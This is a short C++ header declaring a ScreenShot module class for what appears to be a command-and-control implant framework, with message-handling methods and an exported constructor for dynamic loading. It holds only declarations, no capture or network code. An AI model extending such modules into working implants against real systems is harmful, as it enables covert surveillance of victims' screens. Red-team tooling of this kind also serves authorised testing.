#pragma once

#include "ModuleCmd.hpp"


class ScreenShot : public ModuleCmd
{

public:
	ScreenShot();
	~ScreenShot();

	std::string getInfo();

	int init(std::vector<std::string>& splitedCmd, C2Message& c2Message);
	int process(C2Message& c2Message, C2Message& c2RetMessage);
	int errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg);
	int recurringExec(C2Message& c2RetMessage);
	int followUp(const C2Message &c2RetMessage);

private:

};


#ifdef _WIN32

extern "C" __declspec(dllexport) ScreenShot * ScreenShotConstructor();

#else

extern "C"  __attribute__((visibility("default"))) ScreenShot * ScreenShotConstructor();

#endif
